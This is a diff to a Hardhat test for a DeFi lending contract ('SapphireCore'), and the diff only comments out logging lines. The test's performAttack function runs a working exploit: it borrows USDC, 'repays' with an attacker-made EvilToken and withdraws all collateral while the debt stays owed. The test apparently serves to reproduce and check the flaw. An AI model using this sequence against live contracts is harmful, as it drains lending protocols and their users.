@@ -59,75 +59,75 @@ describe('SapphireCore - V2 Upgrade', () => {
   let evilToken: EvilToken;
 
   async function performAttack() {
-    console.log('\ninitial balances');
+    // console.log('\ninitial balances');
     const initialWethBalance = await weth.balanceOf(attackerAddress);
     const initialUsdcBalance = await usdc.balanceOf(attackerAddress);
-    console.log('balance WETH', utils.formatEther(initialWethBalance));
-    console.log('balance USDC', utils.formatUnits(initialUsdcBalance, 6));
+    // console.log('balance WETH', utils.formatEther(initialWethBalance));
+    // console.log('balance USDC', utils.formatUnits(initialUsdcBalance, 6));
 
-    console.log('\n\ndeposit...');
+    // console.log('\n\ndeposit...');
     await core.deposit(COLLATERAL_AMOUNT, [
       CREDIT_SCORE_PROOF,
       CREDIT_LIMIT_PROOF,
     ]);
-    console.log(
-      'balance WETH',
-      utils.formatEther(await weth.balanceOf(attackerAddress)),
-    );
-    console.log(
-      'balance USDC',
-      utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
-    );
+    // console.log(
+    //   'balance WETH',
+    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
+    // );
+    // console.log(
+    //   'balance USDC',
+    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
+    // );
 
-    console.log('\n\nborrow...');
+    // console.log('\n\nborrow...');
     await core.borrow(
       USDC_BORROW_AMOUNT,
       // USDC = borrowed asset
       '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
       [CREDIT_SCORE_PROOF, CREDIT_LIMIT_PROOF],
     );
-    console.log(
-      'balance WETH',
-      utils.formatEther(await weth.balanceOf(attackerAddress)),
-    );
-    console.log(
-      'balance USDC',
-      utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
-    );
+    // console.log(
+    //   'balance WETH',
+    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
+    // );
+    // console.log(
+    //   'balance USDC',
+    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
+    // );
     let vault = await core.vaults(attackerAddress);
     expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
-    console.log('principal', utils.formatEther(vault.principal));
+    // console.log('principal', utils.formatEther(vault.principal));
 
     // Increase time to accumulate some interest.
-    console.log('Increase time...');
+    // console.log('Increase time...');
     await hre.network.provider.send('evm_increaseTime', [60 * 20]);
 
-    console.log('\n\nrepay with Evil Token...');
+    // console.log('\n\nrepay with Evil Token...');
     // This should be reverted in theory, but it's not
     await core.repay('1', evilToken.address, [
       CREDIT_SCORE_PROOF,
       CREDIT_LIMIT_PROOF,
     ]);
     vault = await core.vaults(attackerAddress);
-    console.log(
-      'balance WETH',
-      utils.formatEther(await weth.balanceOf(attackerAddress)),
-    );
-    console.log(
-      'balance USDC',
-      utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
-    );
+    // console.log(
+    //   'balance WETH',
+    //   utils.formatEther(await weth.balanceOf(attackerAddress)),
+    // );
+    // console.log(
+    //   'balance USDC',
+    //   utils.formatUnits(await usdc.balanceOf(attackerAddress), 6),
+    // );
     expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
-    console.log('principal', utils.formatEther(vault.principal));
+    // console.log('principal', utils.formatEther(vault.principal));
 
     // Withdraw the initial collateral
-    console.log('\n\nwithdraw...');
+    // console.log('\n\nwithdraw...');
     await core.withdraw(COLLATERAL_AMOUNT, [
       CREDIT_SCORE_PROOF,
       CREDIT_LIMIT_PROOF,
     ]);
 
-    console.log('\n\nFinal balances');
+    // console.log('\n\nFinal balances');
     const finalWeth = await weth.balanceOf(attackerAddress);
     const finalUsdc = await usdc.balanceOf(attackerAddress);
     vault = await core.vaults(attackerAddress);
@@ -138,10 +138,10 @@ describe('SapphireCore - V2 Upgrade', () => {
     expect(vault.principal).to.eq(USDC_BORROW_AMOUNT.mul(1e12));
     expect(vault.collateralAmount).to.eq(0);
 
-    console.log('balance WETH', utils.formatEther(finalWeth));
-    console.log('balance USDC', utils.formatUnits(finalUsdc, 6));
-    console.log('principal', utils.formatEther(vault.principal));
-    console.log('collateral', utils.formatEther(vault.collateralAmount));
+    // console.log('balance WETH', utils.formatEther(finalWeth));
+    // console.log('balance USDC', utils.formatUnits(finalUsdc, 6));
+    // console.log('principal', utils.formatEther(vault.principal));
+    // console.log('collateral', utils.formatEther(vault.collateralAmount));
   }
 
   before(async () => {
